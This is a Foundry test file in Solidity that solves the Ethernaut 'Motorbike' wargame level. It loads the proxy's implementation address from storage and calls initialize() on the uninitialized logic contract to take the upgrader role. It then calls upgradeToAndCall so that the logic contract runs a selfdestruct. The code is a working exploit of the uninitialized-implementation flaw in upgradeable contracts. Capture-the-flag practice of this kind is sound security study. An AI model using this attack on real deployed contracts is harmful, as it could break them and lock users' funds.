pragma solidity 0.8.10;

import "forge-std/Test.sol";

import "../src/ethernaut/core/Ethernaut.sol";

// import "../src/ethernaut/25-Motorbike/MotorbikeFactory.sol";
// import "../src/ethernaut/25-Motorbike/Motorbike.sol";

abstract contract IMotorbike {
    address public upgrader;
    uint256 public horsePower;

    function initialize() external virtual;

    function upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) external payable virtual;
}

contract MotorbikeTest is Test {
    Ethernaut ethernaut;
    bytes32 internal constant _IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    function setUp() public {
        //setup
        ethernaut = new Ethernaut();
    }

    function testAttck() public {
        address factory = deployCode("MotorbikeFactory.sol");
        ethernaut.registerLevel(Level(factory));
        address levelAddress = ethernaut.createLevelInstance(Level(factory));

        IMotorbike motorbike = IMotorbike(levelAddress);

        console.log("upgrader address", motorbike.upgrader());
        console.log("horsePower", motorbike.horsePower());

        bytes32 logic = vm.load(levelAddress, _IMPLEMENTATION_SLOT);
        // convert bytes32 to address
        address logicAddr = address(uint160(uint256(logic)));
        console.log("logicAddr", logicAddr);
        IMotorbike logicMotorbike = IMotorbike(logicAddr);
        console.log("logic upgrader address", logicMotorbike.upgrader());
        console.log("logic horsePower", logicMotorbike.horsePower());
        logicMotorbike.initialize();
        console.log("logic upgrader address", logicMotorbike.upgrader());
        console.log("logic horsePower", logicMotorbike.horsePower());

        logicMotorbike.upgradeToAndCall(
            address(this),
            abi.encodeWithSignature("destroy()")
        );
        //test里调用selfdestruct无效 手动处理
        vm.etch(logicAddr, "");

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        assert(levelSuccessfullyPassed);
    }

    function destroy() external {
        selfdestruct(payable(address(0)));
    }
}
